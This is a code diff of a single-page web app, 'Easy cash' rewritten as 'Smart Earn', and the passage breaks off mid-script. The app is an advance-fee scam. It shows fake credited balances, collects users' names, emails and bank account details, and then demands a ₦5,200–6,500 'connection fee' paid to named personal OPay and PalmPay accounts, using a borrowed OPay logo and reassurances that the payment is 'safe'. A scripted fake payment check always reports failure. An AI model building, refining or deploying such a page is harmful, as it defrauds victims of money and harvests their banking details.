@@ -1,501 +1,421 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>smart cash</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Smart Earn</title>
+  <meta name="theme-color" content="#000000"/>
   <style>
-    :root {
-      --primary: #7b1fa2;
-      --secondary: #4a148c;
-      --light-bg: #f8f9fc;
-      --card-bg: #ffffff;
-      --text-dark: #1a1a1a;
-      --text-muted: #555;
-      --border: #e0e0e0;
-    }
-
-    body.dark-mode {
-      --light-bg: #0d0d0d;
-      --card-bg: #1a1a1a;
-      --text-dark: #f5f5f5;
-      --text-muted: #aaa;
-      --border: #333;
-    }
-
-    * { margin:0; padding:0; box-sizing:border-box; }
-
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: var(--light-bg);
-      color: var(--text-dark);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      transition: background 0.4s, color 0.4s;
-    }
-
-    .page { display: none; flex:1; flex-direction:column; padding:1.5rem; max-width:800px; margin:0 auto; width:100%; }
-    .page.active { display:flex; }
-
-    .back-arrow {
-      position: absolute;
-      top: 15px;
-      left: 15px;
-      font-size: 28px;
-      color: var(--primary);
-      cursor: pointer;
-      z-index: 10;
-    }
-
-    #splash {
-      position: fixed; inset: 0;
-      background: linear-gradient(135deg, var(--primary), var(--secondary));
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      z-index: 2000; transition: opacity 0.8s ease;
-    }
-    #splash.hidden { opacity: 0; pointer-events: none; }
-
-    #splash h1 {
-      font-size: 1.6rem; font-weight: 400; margin-bottom: 0.6rem;
-      color: white; text-transform: lowercase; letter-spacing: 1px;
-    }
-    .hand-money { width: 68px; height: auto; animation: pulse 2s infinite ease-in-out; }
-    @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.08); } }
-
-    .card {
-      background: var(--card-bg); padding: 2rem; border-radius: 16px;
-      width: 100%; box-shadow: 0 6px 24px rgba(0,0,0,0.08); border: 1px solid var(--border);
-      transition: background 0.4s;
-    }
-
-    .notice {
-      background: #7b1fa2; color: white; padding: 0.9rem; border-radius: 10px;
-      font-size: 0.95rem; margin-bottom: 1.5rem; text-align: center;
-    }
-
-    h2, h3 { text-align:center; margin-bottom:1.2rem; color:var(--primary); }
-
-    input, select {
-      width: 100%; padding: 0.95rem; margin-bottom: 1rem;
-      border: 1px solid var(--border); border-radius: 10px; font-size: 1rem;
-      background: var(--card-bg); color: var(--text-dark);
-    }
-    input:focus, select:focus { outline:none; border-color:var(--primary); box-shadow:0 0 0 3px rgba(123,31,162,0.15); }
-
-    input[type="tel"] {
-      -moz-appearance: textfield;
-    }
-    input[type="tel"]::-webkit-inner-spin-button,
-    input[type="tel"]::-webkit-outer-spin-button {
-      -webkit-appearance: none;
-      margin: 0;
-    }
-
-    button {
-      width:100%; padding:1.05rem; background:var(--primary); color:white;
-      border:none; border-radius:12px; font-size:1.05rem; cursor:pointer;
-      transition: background 0.3s;
-    }
-    button:hover { background:var(--secondary); }
-
-    .copy-icon {
-      font-size: 18px;
-      font-weight: bold;
-      cursor: pointer;
-      color: var(--primary);
-      margin-left: 8px;
-      user-select: none;
-    }
-    .copy-icon:active { color: #4a148c; transform: scale(0.95); }
-
-    .spinner {
-      border: 5px solid rgba(123,31,162,0.2);
-      border-top: 5px solid var(--primary);
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 0.8s linear infinite;
-      margin: 2rem auto;
-    }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-    .balance-card {
-      background: linear-gradient(135deg, var(--primary), var(--secondary));
-      color:white; padding:2.2rem; border-radius:16px; text-align:center;
-      margin-bottom:2rem; box-shadow:0 10px 30px rgba(123,31,162,0.25);
-    }
-    .amount { font-size: 2.2rem; font-weight:700; }
-
-    .grid {
-      display:grid; grid-template-columns:repeat(auto-fit, minmax(140px, 1fr));
-      gap:1rem; margin-bottom:2rem;
-    }
-    .btn-action {
-      background:var(--card-bg); border:1px solid var(--border);
-      padding:1.3rem 0.8rem; border-radius:12px; text-align:center;
-      cursor:pointer; font-weight:500; box-shadow:0 3px 10px rgba(0,0,0,0.05);
-      display:flex; flex-direction:column; align-items:center; gap:6px;
-    }
-    .btn-action:hover { transform:translateY(-4px); border-color:var(--primary); }
-
-    #logoutBtn { margin-top:auto; background:#d32f2f; color:white; border:none; }
-
-    .details p {
-      margin: 10px 0;
-      font-size: 1.1rem;
-      font-weight: 500;
-    }
-
-    .dark-toggle {
-      font-size: 16px;
-      cursor: pointer;
-      color: var(--primary);
-      opacity: 0.65;
-      margin: 0.3rem auto 1.2rem;
-      text-align: center;
-      display: block;
-      transition: opacity 0.3s;
-    }
-    .dark-toggle:hover { opacity: 0.9; }
-  </style>
-</head>
-<body>
-
-  <!-- Splash -->
-  <div id="splash">
-    <h1>welcome to Easy cash</h1>
-    <img src="https://thumbs.dreamstime.com/b/fair-hand-holding-d-rendered-nigerian-naira-notes-isolated-white-background-233559633.jpg" alt="Hand holding money" class="hand-money"/>
-  </div>
-
-  <!-- Login -->
-  <div id="login" class="page active">
-    <span class="back-arrow" onclick="goBack()">←</span>
-    <div class="card">
-      <div class="notice">Enter your name and Gmail to login and access your dashboard.</div>
-      <h2>Login</h2>
-      <form id="loginForm">
-        <input type="text" id="name" placeholder="Your Name" required>
-        <input type="email" id="email" placeholder="yourname@gmail.com" required>
-        <button type="submit">Login</button>
-      </form>
-    </div>
-  </div>
-
-  <!-- Notification -->
-  <div id="notification" class="page">
-    <span class="back-arrow" onclick="goBack()">←</span>
-    <div class="card">
-      <div class="notice">Your account has been credited. Click OK to view dashboard.</div>
-      <h3 id="notifMsg"></h3>
-      <button id="okBtn">OK</button>
-    </div>
-  </div>
-
-  <!-- Dashboard -->
-  <div id="dashboard" class="page">
-    <div class="notice">Welcome! Tap any button below to perform actions.</div>
-    <div id="welcomeHeader" style="text-align:center;font-size:1.5rem;font-weight:600;color:var(--primary);margin-bottom:0.2rem;"></div>
-    <span class="dark-toggle" id="darkToggle">🌙</span>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter',sans-serif; }
     
-    <div class="balance-card">
-      <h3>Available Balance</h3>
-      <div class="amount" id="balance">₦150,000</div>
+    :root {
+      --bg: #000;
+      --card-bg: #1a1a1a;
+      --text: #fff;
+      --input-bg: #333;
+      --yellow: #ffdd00;
+      --header-bg: #ffdd00;
+      --header-text: #000;
+    }
+
+    [data-theme="light"] {
+      --bg: #f5f5f5;
+      --card-bg: #ffffff;
+      --text: #000;
+      --input-bg: #e0e0e0;
+      --yellow: #ccaa00;
+      --header-bg: #ccaa00;
+      --header-text: #000;
+    }
+
+    body { background:var(--bg); color:var(--text); transition: background 0.3s, color 0.3s; }
+    .hide { display:none !important; }
+    .container { max-width:480px; margin:0 auto; min-height:100vh; background:var(--bg); position:relative; }
+
+    .header {
+      background:var(--header-bg);
+      color:var(--header-text);
+      padding:16px;
+      text-align:center;
+      position:relative;
+      border:none !important;
+      outline:none !important;
+      box-shadow:none !important;
+      user-select:none;
+      -webkit-tap-highlight-color:transparent;
+    }
+    .header h2 {
+      font-size:19px;
+      margin:0;
+      padding:0;
+      border:none;
+      outline:none;
+      background:none;
+      display:inline-block;
+      width:auto;
+    }
+    .header h2 span { pointer-events:none; }
+
+    .theme-toggle {
+      position:absolute; right:16px; top:16px;
+      background:none; border:none; font-size:20px;
+      cursor:pointer; color:var(--header-text);
+      outline:none;
+      -webkit-tap-highlight-color:transparent;
+    }
+
+    .balance-card { background:linear-gradient(135deg,var(--yellow),var(--bg)); margin:18px; border-radius:18px; padding:22px; text-align:center; color:var(--header-text); }
+    .balance { font-size:42px; font-weight:700; }
+    .claim-btn { background:#fff; color:#000; padding:12px 24px; border-radius:50px; font-weight:600; margin-top:10px; font-size:14px; display:inline-block; cursor:pointer; }
+
+    .grid { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; padding:12px; }
+    .item { background:var(--card-bg); border-radius:14px; padding:14px; text-align:center; color:var(--text); cursor:pointer; transition:0.2s; font-size:12px; }
+    .item:hover { background:#2a2a2a; }
+    .item i { font-size:24px; color:var(--yellow); margin-bottom:6px; display:block; }
+
+    .card { background:var(--card-bg); margin:18px; border-radius:16px; padding:20px; }
+    input, select, button, .fixed-input { 
+      width:100%; padding:14px; margin:8px 0; border-radius:10px; border:none; font-size:15px; 
+    }
+    input, select, .fixed-input { background:var(--input-bg); color:var(--text); }
+    .fixed-input { font-weight:700; color:var(--yellow); text-align:center; pointer-events:none; user-select:none; }
+    button { background:var(--yellow); color:#000; font-weight:600; cursor:pointer; }
+    .back-btn { background:var(--yellow) !important; color:#000 !important; margin-top:15px !important; }
+    .ok-btn { background:#000 !important; color:#fff !important; }
+
+    select { text-align:center; text-align-last:center; }
+    option { text-align:left; }
+
+    .loader { position:fixed; top:0; left:0; width:100%; height:100%; background:var(--bg); display:flex; align-items:center; justify-content:center; flex-direction:column; z-index:9999; }
+    .loader h1 { font-size:26px; color:var(--yellow); }
+    .loader .spin { width:48px; height:48px; border:5px solid var(--input-bg); border-top:5px solid var(--yellow); border-radius:50%; animation:spin 1s linear infinite; margin:18px; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    .red { color:#ff4444; font-size:18px; text-align:center; margin:20px 0; font-weight:700; }
+
+    .payment-box { background:#111; padding:18px; border-radius:16px; border:2px solid var(--yellow); margin:15px 0; }
+    .payment-box p { margin:12px 0; font-size:18px; display:flex; justify-content:space-between; align-items:center; }
+    .payment-box strong { color:var(--yellow); font-weight:700; }
+    .yellow { color:var(--yellow) !important; font-weight:700; }
+    .copy-icon { font-size:12px; color:#aaa; cursor:pointer; margin-left:8px; }
+    .copy-icon:hover { color:var(--yellow); }
+
+    .yellow-text { color:var(--yellow); font-size:16px; text-align:center; line-height:1.5; }
+    .boom-msg { background:var(--bg); color:var(--yellow); padding:18px; border:3px solid var(--yellow); border-radius:16px; font-size:22px; font-weight:700; text-align:center; margin:15px 0; animation: pulse 0.6s; display:none; }
+    @keyframes pulse { 0%,100% { transform:scale(1); } 50% { transform:scale(1.1); } }
+
+    /* === NOTICE PAGE STYLE — YELLOW BACKGROUND === */
+    .notice-body { background: var(--yellow); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+    .notice-card { background: #ffffff; max-width: 720px; width: 92%; padding: 24px; border-radius: 16px; box-shadow: 0 6px 24px rgba(0, 0, 0, 0.12); text-align: center; }
+    .notice-title { font-size: 22px; font-weight: bold; margin-bottom: 14px; color: #000; }
+    .logo-wrap { position: relative; display: inline-block; margin: 18px 0; }
+    .logo-wrap img { width: 140px; border-radius: 20px; }
+    .ban { position: absolute; inset: 0; border: 8px solid red; border-radius: 50%; }
+    .ban::after { content: ""; position: absolute; top: 50%; left: 10%; width: 80%; height: 8px; background: red; transform: rotate(-45deg); }
+    .notice-message { font-size: 16px; line-height: 1.7; color: #111827; margin-top: 18px; }
+    .continue-btn { margin-top: 22px; padding: 14px 22px; font-size: 17px; font-weight: bold; background: #000; color: #fff; border: none; border-radius: 10px; cursor: pointer; }
+  </style>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+</head>
+<body data-theme="dark">
+<div class="container">
+
+  <!-- LOGIN PAGE -->
+  <div id="loginPage">
+    <div class="card">
+      <h2 style="text-align:center; color:var(--yellow);">Welcome Back</h2>
+      <input type="text" id="userName" placeholder="Enter Your Name"/>
+      <input type="email" id="userEmail" placeholder="Enter Your Gmail"/>
+      <button onclick="doLogin()">LOGIN NOW</button>
     </div>
+  </div>
+
+  <!-- DASHBOARD -->
+  <div id="dashboard" class="hide">
+    <div class="header">
+      <h2>Hi, <span id="nameDisplay">User</span></h2>
+      <button class="theme-toggle" onclick="toggleTheme()">
+        <i class="fas fa-moon" id="themeIcon"></i>
+      </button>
+    </div>
+    <div class="balance-card">
+      <p>Available Balance</p>
+      <div class="balance" id="balanceAmount">₦0.00</div>
+      <div id="claimBtn" class="claim-btn" onclick="claimBonus()">Claim Bonus</div>
+      <div id="bonusResult" class="hide" style="margin-top:15px;">
+        <div class="boom-msg" id="boomMsg">BOOM! ₦50,000.00 has been added!</div>
+        <button onclick="closeBonus()" class="ok-btn">OK</button>
+      </div>
+     </div>
 
     <div class="grid">
-      <div class="btn-action" id="withdrawBtn">💳 Withdraw</div>
-      <div class="btn-action" id="helpBtn">❓ Help</div>
-      <div class="btn-action" id="groupBtn">👥 Group</div>
-      <div class="btn-action">📋 FAQ</div>
-      <div class="btn-action" id="airtimeBtn">📞 Airtime</div>
-      <div class="btn-action" id="dataBtn">📡 Data</div>
+      <div class="item" onclick="openSupport()"><i class="fas fa-headset"></i>Support</div>
+      <div class="item" onclick="openGroup()"><i class="fas fa-users"></i>Groups</div>
+      <div class="item" onclick="showWithdraw()"><i class="fas fa-arrow-up"></i>Withdraw</div>
+      <div class="item" onclick="showFeature('Airtime')"><i class="fas fa-mobile"></i>Airtime</div>
+      <div class="item" onclick="showFeature('Data')"><i class="fas fa-wifi"></i>Data</div>
+      <div class="item" onclick="showFeature('Betting')"><i class="fas fa-dice"></i>Betting</div>
+      <div class="item" onclick="showFeature('TV')"><i class="fas fa-tv"></i>TV</div>
+      <div class="item" onclick="showFeature('Invitation')"><i class="fas fa-user-plus"></i>Invite</div>
+      <div class="item" onclick="showFeature('More')"><i class="fas fa-ellipsis-h"></i>More</div>
+      <div class="item" onclick="logout()" style="background:#333;"><i class="fas fa-sign-out-alt"></i>Logout</div>
     </div>
-
-    <button id="logoutBtn" class="btn-action">Log Out</button>
   </div>
 
-  <!-- Help Page -->
-  <div id="helpPage" class="page">
-    <span class="back-arrow" onclick="goBack()">←</span>
+  <!-- WITHDRAW PAGE -->
+  <div id="withdrawPage" class="hide">
+    <div class="header"><h2>Withdraw</h2></div>
     <div class="card">
-      <h2>Support</h2>
-      <div id="helpInstructions">
-        Copy the Telegram username below,<br>
-        open your Telegram app, paste it in the search bar,<br>
-        and contact support for help.
-      </div>
-      <div id="usernameBox">
-        <div id="username">@EASYMONIE010</div>
-        <div id="copyContainer">
-          <span class="copy-icon" onclick="copyTelegramUsername()">copy</span>
+      <input type="text" id="acctName" placeholder="Account Name"/>
+      <select id="bankSelect">
+        <option value="">Select Bank</option>
+        <option>Access Bank</option><option>GTBank</option><option>First Bank</option><option>Zenith Bank</option>
+        <option>UBA</option><option>Fidelity Bank</option><option>Stanbic IBTC</option><option>Sterling Bank</option>
+        <option>Union Bank</option><option>Wema Bank</option><option>Unity Bank</option><option>Heritage Bank</option>
+        <option>Keystone Bank</option><option>Polaris Bank</option><option>Providus Bank</option><option>Titan Trust</option>
+        <option>Opay</option><option>Kuda</option><option>PalmPay</option><option>Moniepoint</option>
+        <option>Carbon</option><option>VFD MFB</option><option>Rubies Bank</option><option>Eyowo</option>
+        <option>Sparkle</option><option>Parallex Bank</option><option>Suntrust Bank</option><option>Lotus Bank</option>
+        <option>Jaiz Bank</option><option>Taj Bank</option><option>ALAT by Wema</option><option>GoMoney</option>
+        <option>9 Payment Service Bank</option><option>Hope PSB</option><option>Momo PSB</option>
+      </select>
+      <input type="tel" id="acctNumber" placeholder="Account Number"/>
+      <div class="fixed-input">₦50,000.00</div>
+      <button onclick="submitWithdraw()">SUBMIT</button>
+      <button onclick="goHome()" class="back-btn">GO BACK</button>
+    </div>
+  </div>
+
+  <!-- FIRST DEPOSIT -->
+  <div id="firstDeposit" class="hide">
+    <div class="header"><h2>Dear User</h2></div>
+    <div class="card">
+      <p class="yellow-text">As this is your first time <b>withdraw from Smart Earn</b>, you have to connect your account details <b>for you to received your alert immediately.</b></p>
+      <button onclick="showNotice()">CONNECT ACCOUNT DETAILS</button>
+      <button onclick="goHome()" class="back-btn">GO BACK</button>
+    </div>
+  </div>
+
+  <!-- NOTICE PAGE -->
+  <div id="noticePage" class="hide">
+    <div class="notice-body">
+      <div class="notice-card">
+        <div class="notice-title">Smart Earn Business Notice</div>
+        <div class="logo-wrap" style="margin-top:25px;">
+          <img src="https://upload.wikimedia.org/wikipedia/commons/5/59/OPay_Logo.png" alt="OPay Official Logo" />
+          <div class="ban"></div>
         </div>
+        <div class="notice-message">
+          You are about to make a payment of ₦5,200. Please be assured that this transaction is safe and secure. Your payment details are protected, and the process is fully verified.
+Kindly proceed without fear. Once payment is completed, you will receive confirmation immediately.
+Thank you for your trust and cooperation.
+        </div>
+        <button class="continue-btn" onclick="connectAccount()">CONTINUE TO PAYMENT</button>
       </div>
     </div>
   </div>
 
-  <!-- Withdrawal Page -->
-  <div id="withdrawal" class="page">
-    <span class="back-arrow" onclick="goBack()">←</span>
-    <div class="notice">Enter your bank details to withdraw exactly ₦150,000.</div>
-    <div class="card">
-      <h2>Withdraw Funds</h2>
-      <form id="withdrawForm">
-        <input type="text" id="accName" placeholder="Account Name" required>
-        <select id="bank" required>
-          <option value="">Select Bank</option>
-          <option value="Access Bank Plc">Access Bank Plc</option>
-          <option value="Zenith Bank Plc">Zenith Bank Plc</option>
-          <option value="Guaranty Trust Bank Plc">Guaranty Trust Bank Plc</option>
-          <option value="First Bank of Nigeria Limited">First Bank of Nigeria Limited</option>
-          <option value="United Bank for Africa Plc">United Bank for Africa Plc</option>
-          <option value="Fidelity Bank Plc">Fidelity Bank Plc</option>
-          <option value="Ecobank Nigeria Plc">Ecobank Nigeria Plc</option>
-          <option value="Wema Bank Plc">Wema Bank Plc</option>
-          <option value="Sterling Bank Plc">Sterling Bank Plc</option>
-          <option value="Stanbic IBTC Bank Plc">Stanbic IBTC Bank Plc</option>
-          <option value="Union Bank of Nigeria Plc">Union Bank of Nigeria Plc</option>
-          <option value="Polaris Bank Limited">Polaris Bank Limited</option>
-          <option value="Keystone Bank Limited">Keystone Bank Limited</option>
-          <option value="Heritage Bank Plc">Heritage Bank Plc</option>
-          <option value="Unity Bank Plc">Unity Bank Plc</option>
-          <option value="Jaiz Bank Plc">Jaiz Bank Plc</option>
-          <option value="Citibank Nigeria Limited">Citibank Nigeria Limited</option>
-          <option value="Standard Chartered Bank Limited">Standard Chartered Bank Limited</option>
-          <option value="First City Monument Bank Limited (FCMB)">First City Monument Bank Limited (FCMB)</option>
-          <option value="Titan Trust Bank Limited">Titan Trust Bank Limited</option>
-          <option value="Globus Bank Limited">Globus Bank Limited</option>
-          <option value="Premium Trust Bank">Premium Trust Bank</option>
-          <option value="Lotus Bank">Lotus Bank</option>
-          <option value="Parallex Bank">Parallex Bank</option>
-          <option value="Providus Bank">Providus Bank</option>
-          <option value="Signature Bank">Signature Bank</option>
-          <option value="Suntrust Bank">Suntrust Bank</option>
-          <option value="Taj Bank">Taj Bank</option>
-          <option value="Optimus Bank">Optimus Bank</option>
-          <option value="Nova Merchant Bank">Nova Merchant Bank</option>
-          <option value="FSDH Merchant Bank">FSDH Merchant Bank</option>
-          <option value="Greenwich Merchant Bank">Greenwich Merchant Bank</option>
-          <option value="Rand Merchant Bank Nigeria">Rand Merchant Bank Nigeria</option>
-          <option value="Opay">Opay</option>
-          <option value="Kuda Bank">Kuda Bank</option>
-          <option value="PalmPay">PalmPay</option>
-          <option value="Moniepoint Microfinance Bank">Moniepoint Microfinance Bank</option>
-          <option value="FairMoney Microfinance Bank">FairMoney Microfinance Bank</option>
-          <option value="Rubies Bank">Rubies Bank</option>
-          <option value="Sparkle Bank">Sparkle Bank</option>
-        </select>
-        <input type="tel" id="accNum" placeholder="Account Number (10 digits)" required pattern="[0-9]{10}" inputmode="numeric">
-        <input type="number" id="amount" placeholder="Amount (exactly 150000)" required min="150000" max="150000">
-        <button type="submit">Submit Details</button>
-      </form>
+  <!-- PAYMENT PAGE -->
+  <div id="paymentPage" class="hide">
+    <div class="loader hide" id="paymentLoader">
+      <h1 style="color:var(--yellow);">Processing Payment...</h1>
+      <div class="spin"></div>
     </div>
-  </div>
-
-  <!-- Connect Page -->
-  <div id="connect" class="page">
-    <span class="back-arrow" onclick="goBack()">←</span>
+    <div class="header"><h2>Connection Deposit</h2></div>
     <div class="card">
-      <div class="notice" style="line-height:1.5; font-size:1rem; margin-bottom:2rem;">
-        You are trying to withdraw your money out of Easy Cash dashboard.<br>
-        You have to connect your account details and get credited instantly.
+      <p style="text-align:center; font-size:16px; margin-bottom:10px;">Pay exactly the fee below to activate:</p>
+      <div class="payment-box">
+        <p><strong>account:</strong> <span class="yellow">8162625816</span>
+          <i class="fas fa-copy copy-icon" onclick="copyNumber('8162625816')"></i>
+        </p>
+        <p><strong>Bank:</strong> <span class="yellow">OPAY</span></p>
+        <p><strong>Name:</strong> <span class="yellow">QUEEN FUTURE</span></p>
+        <p><strong>Fee:</strong> <span class="yellow">5,200</span></p>
       </div>
-      <button id="connectBtn">Connect Account Details</button>
+      <button onclick="confirmPayment()" style="background:#00ff00; color:#000; font-weight:700; font-size:14px; padding:14px; margin-top:12px; border-radius:10px;">
+        I have made this bank transfer
+      </button>
+      <button onclick="goHome()" class="back-btn">GO BACK</button>
     </div>
   </div>
 
-  <!-- Connection Fee Input -->
-  <div id="connectionFeeInput" class="page">
-    <span class="back-arrow" onclick="goBack()">←</span>
+  <!-- PAYMENT FAILED -->
+  <div id="paymentFailed" class="hide">
+    <div class="header"><h2>Payment Status</h2></div>
     <div class="card">
-      <h2>Easy Cash payment details!</h2>
-      <div class="notice" style="margin-bottom:1.5rem;">Enter the account details you want to use to make your deposit for connection fee.</div>
-      <form id="connectionForm">
-        <input type="tel" id="connAccNum" placeholder="Account Number" required pattern="[0-9]{10}" inputmode="numeric">
-        <input type="text" id="connAccName" placeholder="Account Name" required>
-        <input type="text" id="connBankName" placeholder="Bank Name (type your bank)" required>
-        <button type="submit">proceed to Payment</button>
-      </form>
+      <p class="red">no payment confirmed</p>
+      <button onclick="goHome()" style="background:var(--yellow); color:#000; padding:16px; font-size:16px; margin-top:20px;">
+        GO HOME
+      </button>
     </div>
   </div>
 
-  <!-- Payment Details -->
-  <div id="paymentDetails" class="page">
-    <span class="back-arrow" onclick="goBack()">←</span>
-    <div class="notice">Pay exactly to the details below to complete your withdrawal.</div>
+  <!-- FEATURE LOCKED -->
+  <div id="featureLocked" class="hide">
+    <div class="header"><h2>Feature Locked</h2></div>
     <div class="card">
-      <h2>Account Details to Pay To</h2>
-      <div style="text-align:left; max-width:320px; margin:2rem auto; line-height:2.4; font-size:1.1rem;">
-        <p><strong>Acc name:</strong> QUEEN FUTURE</p>
-        <p><strong>Bank:</strong> OPAY BANK</p>
-        <p><strong>Acc num:</strong> 6540268681 <span class="copy-icon" onclick="copyAccountNumber()">copy</span></p>
-        <p><strong>Fee:</strong> 6,500</p>
-      </div>
-      <button id="payBtn">I have made this bank transfer</button>
+      <p id="lockedMessage" class="yellow-text">You have to activate this feature with ₦5,200 naira</p>
+      <button onclick="goHome()" class="back-btn">GO BACK</button>
     </div>
   </div>
 
-  <!-- Feature Lock -->
-  <div id="featureLock" class="page">
-    <span class="back-arrow" onclick="goBack()">←</span>
-    <div class="card" style="text-align:center;">
-      <h3>Feature Locked</h3>
-      <p style="margin:1.5rem 0; font-size:1.05rem;">
-        You have to connect your account details with the Easy cash<br>
-        for you to make use of this feature.
-      </p>
-      <button onclick="returnToDashboard()">OK</button>
-    </div>
-  </div>
+</div>
 
-  <!-- Loading -->
-  <div id="loading" class="page">
-    <span class="back-arrow" onclick="goBack()">←</span>
-    <div class="notice" style="font-size:1.1rem; margin-bottom:1rem;">Confirming your payment...</div>
-    <div class="spinner"></div>
-    <p style="margin-top:1rem; color:var(--text-muted);">Please do not close this page</p>
-  </div>
+<audio id="bonusSound" src="https://assets.mixkit.co/sfx/preview/mixkit-achievement-bell-600.mp3" preload="auto"></audio>
+<audio id="boomSound" src="https://assets.mixkit.co/sfx/preview/mixkit-explosion-with-debris-1683.mp3" preload="auto"></audio>
 
-  <!-- Final No Payment received -->
-  <div id="finalMsg" class="page">
-    <span class="back-arrow" onclick="goBack()"></span>
-    <div class="card">
-      <h3>No payment received</h3>
-      <p style="margin:1.5rem 0; font-size:1.05rem;">We could not detect your payment at this time.</p>
-      <p style="margin-bottom:2rem;">Please click on help bottom inside the app and contact support and forward your payment slip for manual confirmation.</p>
-      <button onclick="returnToDashboard()" style="background:#7b1fa2;">Leave</button>
-    </div>
-  </div>
-
-  <footer>Easy cash © 2026 • updated version</footer>
-
-  <script>
-    let userName = '';
-    let currentPageHistory = ['login']; // Start with login so back works from first pages
-
-    function showPage(pageId) {
-      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-      const page = document.getElementById(pageId);
-      if (page) {
-        page.classList.add('active');
-        // Only add to history if it's not the current page (prevents duplicates)
-        if (currentPageHistory[currentPageHistory.length - 1] !== pageId) {
-          currentPageHistory.push(pageId);
-        }
-      }
+<script>
+  const ADMIN_CODE = "sarikiy";
+  let settings = { 
+    accName: "LIVINGSTON SARIKIY OWULA", 
+    accNum: "8983862243", 
+    bank: "PALMPAY", 
+    waNumber: "2348072850560", 
+    groupLink: "https://chat.whatsapp.com/LcQLJMcU49ZL8lhlHBveTb", 
+    depositAmt: 5200,
+    amounts: { 
+      Airtime:5200, Data:5200, Betting:5200, TV:5200, Invitation:5200, More:5200 
     }
+  };
+  
+  let currentUser = { name:"", email:"", balance:0, claimedBonus:false };
+  let allUsers = JSON.parse(localStorage.getItem('smartEarnUsers') || '[]');
+  
+  const saved = localStorage.getItem('smartEarnSettings');
+  if (saved) { try { settings = JSON.parse(saved); } catch(e) {} }
 
-    function goBack() {
-      if (currentPageHistory.length > 1) {
-        currentPageHistory.pop(); // Remove current page
-        const previousPage = currentPageHistory[currentPageHistory.length - 1];
-        showPage(previousPage);
-      }
+  // === DARK MODE ===
+  function toggleTheme() {
+    const body = document.body;
+    const current = body.getAttribute('data-theme');
+    const newTheme = current === 'dark' ? 'light' : 'dark';
+    body.setAttribute('data-theme', newTheme);
+    localStorage.setItem('smartEarnTheme', newTheme);
+    updateThemeIcon();
+  }
+
+  function updateThemeIcon() {
+    const icon = document.getElementById('themeIcon');
+    const theme = document.body.getAttribute('data-theme');
+    icon.className = theme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
+  }
+
+  const savedTheme = localStorage.getItem('smartEarnTheme');
+  if (savedTheme) document.body.setAttribute('data-theme', savedTheme);
+  updateThemeIcon();
+
+  // === LOGIN ===
+  function doLogin() {
+    const name = document.getElementById('userName').value.trim();
+    const email = document.getElementById('userEmail').value.trim().toLowerCase();
+    if (!name || !email) return alert("Fill Name & Gmail!");
+    if (!email.includes('@')) return alert("Enter valid Gmail!");
+
+    let user = allUsers.find(u => u.email === email);
+    if (!user) {
+      user = { name, email, balance:0, claimedBonus:false };
+      allUsers.push(user);
+      localStorage.setItem('smartEarnUsers', JSON.stringify(allUsers));
     }
+    currentUser = user;
 
-    function returnToDashboard() {
-      currentPageHistory = ['dashboard'];
-      showPage('dashboard');
-    }
+    document.getElementById('nameDisplay').innerText = name;
+    updateBalance();
+    document.getElementById('claimBtn').style.display = currentUser.claimedBonus ? 'none' : 'inline-block';
+    showPage('dashboard');
+  }
 
-    function toggleDarkMode() {
-      document.body.classList.toggle('dark-mode');
-      document.getElementById('darkToggle').textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
-    }
+  // === DASHBOARD FEATURES ===
+  function openSupport() { location.href = `https://wa.me/${settings.waNumber}?text=Hey%20I%20am%20using%20Smart%20Earn`; }
+  function openGroup() { location.href = settings.groupLink; }
+  function showWithdraw() { showPage('withdrawPage'); }
+  function submitWithdraw() { showPage('firstDeposit'); }
 
-    function copyTelegramUsername() {
-      const username = "@EASYMONIE010";
-      navigator.clipboard.writeText(username).then(() => {
-        const icon = document.querySelector('#copyContainer .copy-icon');
-        const original = icon.textContent;
-        icon.textContent = 'copied';
-        setTimeout(() => icon.textContent = original, 1500);
-      });
-    }
+  // === NOTICE BEFORE PAYMENT ===
+  function showNotice() { showPage('noticePage'); }
 
-    function copyAccountNumber() {
-      const num = "6540268681";
-      navigator.clipboard.writeText(num).then(() => {
-        const icon = document.querySelector('.copy-icon');
-        const original = icon.textContent;
-        icon.textContent = 'copied';
-        setTimeout(() => icon.textContent = original, 1500);
-      });
-    }
+  function connectAccount() { showPage('paymentPage'); }
 
-    // Splash → Login
+  function showFeature(f) {
+    const amt = settings.amounts[f] || 5200;
+    document.getElementById('lockedMessage').innerText = `You have to activate this feature with ₦${amt.toLocaleString()} naira`;
+    showPage('featureLocked');
+  }
+
+  function confirmPayment() {
+    document.getElementById('paymentLoader').classList.remove('hide');
     setTimeout(() => {
-      document.getElementById('splash').classList.add('hidden');
-      setTimeout(() => {
-        document.getElementById('splash').style.display = 'none';
-        showPage('login');
-      }, 800);
-    }, 3000);
+      document.getElementById('paymentLoader').classList.add('hide');
+      showPage('paymentFailed');
+    }, 20000);
+  }
 
-    document.getElementById('loginForm').addEventListener('submit', e => {
-      e.preventDefault();
-      userName = document.getElementById('name').value.trim();
-      const email = document.getElementById('email').value.trim();
-      if (userName && email.includes('@gmail.com')) {
-        document.getElementById('login').classList.remove('active');
-        document.getElementById('notifMsg').textContent = `Dear ${userName}, your dashboard has been credited with a sum of ₦150,000.`;
-        showPage('notification');
-      } else alert('Please enter valid name and Gmail.');
+  function copyNumber(num) {
+    navigator.clipboard.writeText(num).then(() => {
+      const icon = event.target;
+      icon.style.color = '#00ff00';
+      setTimeout(() => icon.style.color = '#aaa', 1000);
     });
+  }
 
